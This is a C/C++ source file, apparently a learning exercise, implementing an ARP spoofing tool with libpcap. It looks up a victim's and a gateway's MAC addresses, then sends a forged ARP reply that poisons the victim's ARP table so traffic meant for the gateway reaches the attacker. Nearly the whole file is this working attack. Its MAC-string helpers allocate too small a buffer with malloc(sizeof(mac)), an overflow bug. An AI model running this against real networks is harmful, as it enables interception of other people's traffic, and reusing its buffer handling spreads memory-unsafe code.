#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>   //ifreq
#include <unistd.h>   //close
#include <stdlib.h>
#include <pcap.h>
#include <arpa/inet.h>
#include "ethhdr.h"
#include "arphdr.h"

#include <netinet/if_ether.h>
#include <net/if_arp.h>
#include <net/ethernet.h>

#pragma pack(push, 1)
struct EthArpPacket {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

typedef struct EthernetHeader{ // Ethernet Header
    unsigned char DstMac[6];
    unsigned char SrcMac[6];
    unsigned short Type; 
}ETH;

typedef struct arpheader { // ARP Header total 28 bytes.
    uint16_t htype;
    uint16_t ptype;
    uint8_t hlen; 
    uint8_t plen; 
    uint16_t opcode;
    uint8_t sha[6];
    uint32_t spa;             
    uint8_t tha[6];           
    uint32_t tpa;             
} __attribute__((packed)) arphdr_t; // 정확하게 ARP 패킷 헤더만큼 할당하기 위해서 정렬

int sendPacket(pcap_t* handle, EthArpPacket packet);
char* getMacAddress(char* iface);
char* getIPAddress(char* iface);
char* getMacAddressFromPacket(pcap_t* handle);
EthArpPacket makeArpPacket(char* smac, char* sip, char* tip);
EthArpPacket InfectArpPacket(char* smac, char* tmac, char* gip, char* tip);

int main(int argc, char* argv[]) {
	if(argc != 4)
    {
        printf("[?] syntax: %s <interface> <sender ip> <target ip>\n", argv[0]);
        printf("[?] sample: %s wlan0 10.1.1.3 10.1.1.2\n", argv[0]);
        return -1;
    }

	char* dev = argv[1];
	char* amac = getMacAddress(dev); // attacker(me) MAC
	char* aip = getIPAddress(dev); // attacker(me) IP
	char* sip = argv[2]; // sender ip a.k.a Victim
	char* smac;
	char* tip = argv[3]; // target ip a.k.a Gateway
	char* tmac;

	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "[!] couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	EthArpPacket packet = makeArpPacket(amac, aip, tip); // for getiing Gateway MAC 
    sendPacket(handle, packet);
	tmac = getMacAddressFromPacket(handle);
	
    packet = makeArpPacket(amac, aip, sip); // for getiing Victim MAC
    sendPacket(handle, packet);
	smac = getMacAddressFromPacket(handle);

    printf("[*] Send ARP Packet | %s(%s) -> %s(%s)\n", tip, amac, sip, smac);
    packet = InfectArpPacket(amac, smac, tip, sip); // Infect ARP Table
    sendPacket(handle, packet);

	pcap_close(handle);
}

int sendPacket(pcap_t* handle, EthArpPacket packet)
{
	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "[!] pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		exit(-1);
	}
	return res;
}

char* getMacAddressFromPacket(pcap_t* handle)
{
	int res;
	ETH* eth;
	arphdr_t* arp_packet;
	struct pcap_pkthdr* header;
    unsigned char *mac = NULL;
    const u_char* packet;
    char* ret;

	while(1) {
		res = pcap_next_ex(handle, &header, &packet);
		if (res == 0) continue;
        if (res == -1 || res == -2) {
            printf("[!] pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            break;
        }

		eth = (ETH*)packet;
        if(eth->Type != htons(0x0806)) continue; // ARP Packet Type 0x0806
		
		arp_packet = (arphdr_t *)(packet + 14);	// ETH Header size 14
        mac = (unsigned char*)arp_packet->sha;
        char* ret = (char*)malloc(sizeof(mac));
        //sprintf(ret, "%.2X:%.2X:%.2X:%.2X:%.2X:%.2X", arp_packet->sha[0], arp_packet->sha[1], arp_packet->sha[2], arp_packet->sha[3], arp_packet->sha[4], arp_packet->sha[5]);
        sprintf(ret, "%.2X:%.2X:%.2X:%.2X:%.2X:%.2X", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
        //free(ret);
        return ret;
        break;
	}
return NULL;
}

char* getMacAddress(char* iface)
{
    int fd;
    struct ifreq ifr;
    unsigned char *mac = NULL;

    memset(&ifr, 0, sizeof(ifr));

    fd = socket(AF_INET, SOCK_DGRAM, 0);

    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name , iface , IFNAMSIZ-1);

    if (0 == ioctl(fd, SIOCGIFHWADDR, &ifr)) {
        mac = (unsigned char *)ifr.ifr_hwaddr.sa_data;
        char* ret = (char*)malloc(sizeof(mac));
        sprintf(ret, "%.2X:%.2X:%.2X:%.2X:%.2X:%.2X", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
        close(fd);
        //free(ret);
        return ret;
    }

    close(fd);
    printf("[!] %s : No such Network Interface Card\n", iface);
    exit(-1);
}

char* getIPAddress(char *iface)
{
    int fd;
    struct ifreq ifr;
    char* aip = NULL;

    memset(&ifr, 0, sizeof(ifr));

    fd = socket(AF_INET, SOCK_DGRAM, 0);

    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name , iface , IFNAMSIZ-1);

    if (0 == ioctl(fd, SIOCGIFADDR, &ifr)) {
	    aip = inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr);
        close(fd);
        return aip;
    }

    close(fd);
    printf("[!] %s : No such Network Interface Card\n", iface);
    exit(-1);
}

EthArpPacket makeArpPacket(char* smac, char* sip, char* tip)
{
	EthArpPacket packet;

	// ARP REQUEST TO GATEWAY
	packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff"); // BROADCAST
	packet.eth_.smac_ = Mac(smac); // attacker MAC
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Request); // REQUEST
	packet.arp_.smac_ = Mac(smac); // attacker MAC
	packet.arp_.sip_ = htonl(Ip(sip)); // attacker ip
	packet.arp_.tmac_ = Mac("00:00:00:00:00:00"); // Victim MAC
	packet.arp_.tip_ = htonl(Ip(tip)); // gateway ip

	// ARP REQUEST FOR GET VICTIM MAC
	/*packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff"); // BROADCAST
	packet.eth_.smac_ = Mac(smac); // attacker MAC
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Request); // REQUEST
	packet.arp_.smac_ = Mac(smac); // attacker MAC
	packet.arp_.sip_ = htonl(Ip(sip)); // attacker ip
	packet.arp_.tmac_ = Mac("00:00:00:00:00:00"); // Victim MAC
	packet.arp_.tip_ = htonl(Ip(tip)); // victim ip
	*/
	return packet;
}

EthArpPacket InfectArpPacket(char* smac, char* tmac, char* gip, char* tip)
{
	EthArpPacket packet;

	// ARP REQUEST FOR ARP SPOOFING
	packet.eth_.dmac_ = Mac(tmac); // Victim MAC
	packet.eth_.smac_ = Mac(smac); // attacker MAC
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Reply); // Reply
	packet.arp_.smac_ = Mac(smac); // attacker MAC
	packet.arp_.sip_ = htonl(Ip(gip)); // gateway ip
	packet.arp_.tmac_ = Mac(tmac); // Victim MAC
	packet.arp_.tip_ = htonl(Ip(tip)); // victim ip
	return packet;
}
